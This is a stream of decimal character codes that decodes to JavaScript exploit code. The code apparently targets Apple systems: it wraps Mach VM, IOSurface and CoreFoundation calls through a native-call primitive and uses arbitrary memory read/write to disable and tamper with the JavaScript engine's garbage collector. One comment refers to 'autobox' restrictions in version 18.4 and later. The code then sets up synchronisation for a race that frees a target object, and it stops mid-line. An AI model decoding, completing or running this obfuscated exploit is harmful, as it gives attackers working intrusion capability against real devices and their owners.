119, 104, 101, 110, 99, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 76, 83, 69, 69, 75, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 119, 104, 101, 110, 99, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 115, 121, 110, 99, 40, 102, 100, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 83, 89, 78, 67, 44, 32, 102, 100, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 87, 105, 116, 104, 67, 83, 116, 114, 105, 110, 103, 40, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 99, 115, 116, 114, 105, 110, 103, 44, 32, 101, 110, 99, 111, 100, 105, 110, 103, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 87, 73, 84, 72, 67, 83, 84, 82, 73, 78, 71, 44, 32, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 99, 115, 116, 114, 105, 110, 103, 44, 32, 101, 110, 99, 111, 100, 105, 110, 103, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 67, 111, 112, 121, 40, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 99, 102, 115, 116, 114, 105, 110, 103, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 67, 79, 80, 89, 44, 32, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 99, 102, 115, 116, 114, 105, 110, 103, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 83, 101, 116, 86, 97, 108, 117, 101, 40, 100, 105, 99, 116, 44, 32, 107, 101, 121, 44, 32, 118, 97, 108, 117, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 83, 69, 84, 86, 65, 76, 85, 69, 44, 32, 100, 105, 99, 116, 44, 32, 107, 101, 121, 44, 32, 118, 97, 108, 117, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 78, 117, 109, 98, 101, 114, 67, 114, 101, 97, 116, 101, 40, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 116, 104, 101, 84, 121, 112, 101, 44, 32, 118, 97, 108, 117, 101, 80, 116, 114, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 78, 85, 77, 66, 69, 82, 67, 82, 69, 65, 84, 69, 44, 32, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 116, 104, 101, 84, 121, 112, 101, 44, 32, 118, 97, 108, 117, 101, 80, 116, 114, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 73, 79, 83, 117, 114, 102, 97, 99, 101, 67, 114, 101, 97, 116, 101, 40, 100, 105, 99, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 73, 79, 83, 85, 82, 70, 65, 67, 69, 67, 82, 69, 65, 84, 69, 44, 32, 100, 105, 99, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 73, 79, 83, 117, 114, 102, 97, 99, 101, 71, 101, 116, 66, 97, 115, 101, 65, 100, 100, 114, 101, 115, 115, 40, 115, 117, 114, 102, 97, 99, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 73, 79, 83, 85, 82, 70, 65, 67, 69, 71, 69, 84, 66, 65, 83, 69, 65, 68, 68, 82, 69, 83, 83, 44, 32, 115, 117, 114, 102, 97, 99, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 73, 79, 83, 117, 114, 102, 97, 99, 101, 80, 114, 101, 102, 101, 116, 99, 104, 80, 97, 103, 101, 115, 40, 115, 117, 114, 102, 97, 99, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 73, 79, 83, 85, 82, 70, 65, 67, 69, 80, 82, 69, 70, 69, 84, 67, 72, 80, 65, 71, 69, 83, 44, 32, 115, 117, 114, 102, 97, 99, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 82, 101, 108, 101, 97, 115, 101, 40, 111, 98, 106, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 82, 69, 76, 69, 65, 83, 69, 44, 32, 111, 98, 106, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 104, 111, 119, 40, 111, 98, 106, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 72, 79, 87, 44, 32, 111, 98, 106, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 109, 97, 107, 101, 95, 109, 101, 109, 111, 114, 121, 95, 101, 110, 116, 114, 121, 95, 54, 52, 40, 116, 97, 114, 103, 101, 116, 95, 116, 97, 115, 107, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 112, 101, 114, 109, 105, 115, 115, 105, 111, 110, 44, 32, 111, 98, 106, 101, 99, 116, 95, 104, 97, 110, 100, 108, 101, 44, 32, 112, 97, 114, 101, 110, 116, 95, 101, 110, 116, 114, 121, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 77, 65, 75, 69, 95, 77, 69, 77, 79, 82, 89, 95, 69, 78, 84, 82, 89, 95, 54, 52, 44, 32, 116, 97, 114, 103, 101, 116, 95, 116, 97, 115, 107, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 112, 101, 114, 109, 105, 115, 115, 105, 111, 110, 44, 32, 111, 98, 106, 101, 99, 116, 95, 104, 97, 110, 100, 108, 101, 44, 32, 112, 97, 114, 101, 110, 116, 95, 101, 110, 116, 114, 121, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 118, 109, 95, 109, 97, 112, 40, 116, 97, 114, 103, 101, 116, 95, 116, 97, 115, 107, 44, 32, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 44, 32, 109, 97, 115, 107, 44, 32, 102, 108, 97, 103, 115, 44, 32, 111, 98, 106, 101, 99, 116, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 99, 111, 112, 121, 44, 32, 99, 117, 114, 95, 112, 114, 111, 116, 101, 99, 116, 105, 111, 110, 44, 32, 109, 97, 120, 95, 112, 114, 111, 116, 101, 99, 116, 105, 111, 110, 44, 32, 105, 110, 104, 101, 114, 105, 116, 97, 110, 99, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 86, 77, 95, 77, 65, 80, 44, 32, 116, 97, 114, 103, 101, 116, 95, 116, 97, 115, 107, 44, 32, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 44, 32, 109, 97, 115, 107, 44, 32, 102, 108, 97, 103, 115, 44, 32, 111, 98, 106, 101, 99, 116, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 99, 111, 112, 121, 44, 32, 99, 117, 114, 95, 112, 114, 111, 116, 101, 99, 116, 105, 111, 110, 32, 124, 32, 40, 109, 97, 120, 95, 112, 114, 111, 116, 101, 99, 116, 105, 111, 110, 32, 60, 60, 32, 51, 50, 110, 41, 44, 32, 105, 110, 104, 101, 114, 105, 116, 97, 110, 99, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 109, 97, 112, 40, 97, 100, 100, 114, 44, 32, 108, 101, 110, 44, 32, 112, 114, 111, 116, 44, 32, 102, 108, 97, 103, 115, 44, 32, 102, 100, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 77, 65, 80, 44, 32, 97, 100, 100, 114, 44, 32, 108, 101, 110, 44, 32, 112, 114, 111, 116, 44, 32, 102, 108, 97, 103, 115, 44, 32, 102, 100, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 108, 111, 99, 107, 40, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 76, 79, 67, 75, 44, 32, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 117, 110, 108, 111, 99, 107, 40, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 85, 78, 76, 79, 67, 75, 44, 32, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 112, 111, 114, 116, 95, 100, 101, 97, 108, 108, 111, 99, 97, 116, 101, 40, 116, 97, 115, 107, 44, 32, 110, 97, 109, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 80, 79, 82, 84, 95, 68, 69, 65, 76, 76, 79, 67, 65, 84, 69, 44, 32, 116, 97, 115, 107, 44, 32, 110, 97, 109, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 116, 97, 115, 107, 95, 115, 101, 108, 102, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 48, 120, 50, 48, 51, 110, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 118, 97, 108, 61, 48, 110, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 117, 102, 32, 61, 32, 99, 97, 108, 108, 111, 99, 40, 49, 110, 44, 32, 56, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 98, 117, 102, 44, 32, 118, 97, 108, 41, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 98, 117, 102, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 100, 105, 115, 97, 98, 108, 101, 95, 103, 99, 40, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 118, 109, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 103, 108, 111, 98, 97, 108, 84, 104, 105, 115, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 32, 43, 32, 48, 120, 51, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 104, 101, 97, 112, 32, 61, 32, 118, 109, 32, 43, 32, 48, 120, 99, 48, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 83, 97, 102, 101, 84, 111, 67, 111, 108, 108, 101, 99, 116, 32, 61, 32, 104, 101, 97, 112, 32, 43, 32, 48, 120, 50, 52, 49, 110, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 105, 115, 83, 97, 102, 101, 84, 111, 67, 111, 108, 108, 101, 99, 116, 44, 32, 48, 110, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 103, 99, 32, 100, 105, 115, 97, 98, 108, 101, 100, 33, 33, 34, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 101, 110, 97, 98, 108, 101, 95, 103, 99, 40, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 118, 109, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 103, 108, 111, 98, 97, 108, 84, 104, 105, 115, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 32, 43, 32, 48, 120, 51, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 104, 101, 97, 112, 32, 61, 32, 118, 109, 32, 43, 32, 48, 120, 99, 48, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 83, 97, 102, 101, 84, 111, 67, 111, 108, 108, 101, 99, 116, 32, 61, 32, 104, 101, 97, 112, 32, 43, 32, 48, 120, 50, 52, 49, 110, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 105, 115, 83, 97, 102, 101, 84, 111, 67, 111, 108, 108, 101, 99, 116, 44, 32, 49, 110, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 103, 99, 32, 101, 110, 97, 98, 108, 101, 100, 33, 33, 34, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 100, 105, 115, 97, 114, 109, 95, 103, 99, 40, 41, 32, 123, 10, 32, 32, 32, 32, 47, 42, 10, 32, 32, 32, 32, 32, 32, 32, 32, 10, 32, 32, 32, 32, 32, 32, 32, 32, 80, 114, 111, 98, 108, 101, 109, 58, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 71, 67, 32, 105, 115, 32, 116, 114, 105, 103, 103, 101, 114, 105, 110, 103, 44, 32, 97, 110, 100, 32, 105, 116, 32, 99, 97, 108, 108, 115, 32, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 115, 32, 45, 62, 32, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 32, 45, 62, 32, 116, 104, 114, 101, 97, 100, 46, 103, 101, 116, 82, 101, 103, 105, 115, 116, 101, 114, 115, 32, 45, 62, 32, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 95, 115, 116, 97, 116, 101, 10, 32, 32, 32, 32, 32, 32, 32, 32, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 95, 115, 116, 97, 116, 101, 32, 105, 115, 32, 98, 97, 110, 110, 101, 100, 32, 98, 121, 32, 97, 117, 116, 111, 98, 111, 120, 32, 105, 110, 32, 62, 61, 49, 56, 46, 52, 32, 119, 104, 105, 99, 104, 32, 108, 101, 97, 100, 115, 32, 116, 111, 32, 99, 114, 97, 115, 104, 46, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 83, 111, 108, 117, 116, 105, 111, 110, 58, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 84, 111, 32, 119, 111, 114, 107, 32, 99, 111, 114, 114, 101, 99, 116, 108, 121, 32, 105, 110, 32, 110, 111, 106, 105, 116, 32, 101, 110, 118, 105, 114, 111, 110, 109, 101, 110, 116, 32, 71, 67, 32, 110, 101, 101, 100, 115, 32, 116, 111, 32, 115, 99, 97, 110, 32, 97, 116, 32, 108, 101, 97, 115, 116, 32, 116, 104, 101, 32, 115, 116, 97, 99, 107, 32, 111, 102, 32, 99, 117, 114, 114, 101, 110, 116, 32, 116, 104, 114, 101, 97, 100, 32, 119, 105, 116, 104, 32, 99, 97, 108, 108, 32, 116, 111, 32, 103, 97, 116, 104, 101, 114, 70, 114, 111, 109, 67, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 73, 116, 32, 100, 111, 101, 115, 110, 39, 116, 32, 105, 110, 118, 111, 108, 118, 101, 32, 99, 97, 108, 108, 105, 110, 103, 32, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 95, 115, 116, 97, 116, 101, 32, 115, 111, 32, 105, 116, 39, 115, 32, 115, 97, 102, 101, 32, 116, 111, 32, 100, 111, 46, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 118, 111, 105, 100, 32, 77, 97, 99, 104, 105, 110, 101, 84, 104, 114, 101, 97, 100, 115, 58, 58, 103, 97, 116, 104, 101, 114, 67, 111, 110, 115, 101, 114, 118, 97, 116, 105, 118, 101, 82, 111, 111, 116, 115, 40, 46, 46, 46, 41, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 105, 102, 32, 40, 99, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 83, 116, 97, 116, 101, 41, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 103, 97, 116, 104, 101, 114, 70, 114, 111, 109, 67, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 40, 99, 111, 110, 115, 101, 114, 118, 97, 116, 105, 118, 101, 82, 111, 111, 116, 115, 44, 32, 106, 105, 116, 83, 116, 117, 98, 82, 111, 117, 116, 105, 110, 101, 115, 44, 32, 99, 111, 100, 101, 66, 108, 111, 99, 107, 115, 44, 32, 42, 99, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 83, 116, 97, 116, 101, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 46, 46, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 119, 104, 105, 108, 101, 32, 40, 33, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 115, 40, 108, 111, 99, 107, 101, 114, 44, 32, 98, 117, 102, 102, 101, 114, 44, 32, 99, 97, 112, 97, 99, 105, 116, 121, 44, 32, 38, 115, 105, 122, 101, 44, 32, 42, 99, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 41, 41, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 103, 114, 111, 119, 66, 117, 102, 102, 101, 114, 40, 115, 105, 122, 101, 44, 32, 38, 98, 117, 102, 102, 101, 114, 44, 32, 38, 99, 97, 112, 97, 99, 105, 116, 121, 41, 59, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 79, 110, 32, 116, 104, 101, 32, 111, 116, 104, 101, 114, 32, 104, 97, 110, 100, 44, 32, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 115, 32, 119, 105, 108, 108, 32, 116, 114, 121, 32, 116, 111, 32, 105, 116, 101, 114, 97, 116, 101, 32, 116, 104, 114, 101, 97, 100, 115, 32, 111, 102, 32, 104, 101, 97, 112, 46, 109, 95, 116, 104, 114, 101, 97, 100, 71, 114, 111, 117, 112, 32, 97, 110, 100, 32, 99, 97, 108, 108, 32, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 95, 115, 116, 97, 116, 101, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 87, 101, 32, 99, 97, 110, 32, 97, 118, 111, 105, 100, 32, 105, 116, 32, 98, 121, 32, 110, 117, 108, 108, 105, 110, 103, 32, 102, 105, 114, 115, 116, 32, 109, 101, 109, 98, 101, 114, 32, 111, 102, 32, 104, 101, 97, 112, 46, 109, 95, 116, 104, 114, 101, 97, 100, 71, 114, 111, 117, 112, 46, 116, 104, 114, 101, 97, 100, 115, 32, 119, 104, 105, 99, 104, 32, 112, 114, 101, 118, 101, 110, 116, 115, 32, 105, 116, 101, 114, 97, 116, 105, 111, 110, 32, 97, 110, 100, 32, 115, 116, 105, 108, 108, 32, 109, 97, 107, 101, 115, 32, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 115, 32, 114, 101, 116, 117, 114, 110, 32, 116, 114, 117, 101, 46, 10, 32, 32, 32, 32, 10, 32, 32, 32, 32, 42, 47, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 118, 109, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 103, 108, 111, 98, 97, 108, 84, 104, 105, 115, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 32, 43, 32, 48, 120, 51, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 104, 101, 97, 112, 32, 61, 32, 118, 109, 32, 43, 32, 48, 120, 99, 48, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 109, 95, 116, 104, 114, 101, 97, 100, 71, 114, 111, 117, 112, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 104, 101, 97, 112, 32, 43, 32, 48, 120, 49, 57, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 116, 104, 114, 101, 97, 100, 115, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 109, 95, 116, 104, 114, 101, 97, 100, 71, 114, 111, 117, 112, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 116, 104, 114, 101, 97, 100, 115, 32, 43, 32, 48, 120, 50, 48, 110, 44, 32, 48, 120, 48, 110, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 103, 99, 32, 100, 105, 115, 97, 114, 109, 101, 100, 34, 41, 59, 10, 125, 10, 10, 100, 105, 115, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 100, 105, 115, 97, 114, 109, 95, 103, 99, 40, 41, 59, 10, 101, 110, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 10, 10, 76, 79, 71, 40, 34, 91, 43, 93, 32, 72, 101, 108, 108, 111, 32, 102, 114, 111, 109, 58, 32, 34, 32, 43, 32, 109, 97, 99, 104, 95, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 40, 41, 46, 104, 101, 120, 40, 41, 41, 59, 10, 76, 79, 71, 40, 34, 91, 43, 93, 32, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 58, 32, 34, 32, 43, 32, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 46, 104, 101, 120, 40, 41, 41, 59, 10, 10, 108, 101, 116, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 61, 32, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 59, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 104, 114, 101, 97, 100, 95, 115, 116, 97, 114, 116, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 59, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 56, 110, 59, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 105, 122, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 49, 48, 110, 59, 10, 108, 101, 116, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 49, 56, 110, 59, 10, 108, 101, 116, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 111, 102, 102, 115, 101, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 50, 48, 110, 59, 10, 108, 101, 116, 32, 103, 111, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 50, 56, 110, 59, 10, 108, 101, 116, 32, 114, 97, 99, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 51, 48, 110, 59, 10, 10, 99, 109, 112, 56, 95, 119, 97, 105, 116, 95, 102, 111, 114, 95, 99, 104, 97, 110, 103, 101, 40, 102, 114, 101, 101, 95, 116, 104, 114, 101, 97, 100, 95, 115, 116, 97, 114, 116, 95, 112, 116, 114, 44, 32, 48, 41, 59, 10, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 59, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 105, 122, 101, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 105, 122, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 114, 101, 101, 95, 116, 104, 114, 101, 97, 100, 40, 41, 32, 123, 10, 32, 32, 32, 32, 99, 109, 112, 56, 95, 119, 97, 105, 116, 95, 102, 111, 114, 95, 99, 104, 97, 110, 103, 101, 40, 103, 111, 95, 115, 121, 110, 99, 95, 112, 116, 114, 44, 32, 48, 41, 59, 10, 10, 32, 32, 32, 32, 119, 104, 105, 108, 101, 32, 40, 117, 114, 101, 97, 100, 54, 52, 40, 103, 111, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 32, 33, 61, 32, 48, 110, 41, 32, 123, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 47, 47, 32, 101, 110, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 99, 109, 112, 56, 95, 119, 97, 105, 116, 95, 102, 111, 114, 95, 99, 104, 97, 110, 103, 101, 40, 114, 97, 99, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 44, 32, 48, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 47, 47, 32, 100, 105, 115, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 111, 102, 102, 115, 101, 116, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 111, 102, 102, 115, 101, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 59, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 47, 47, 32, 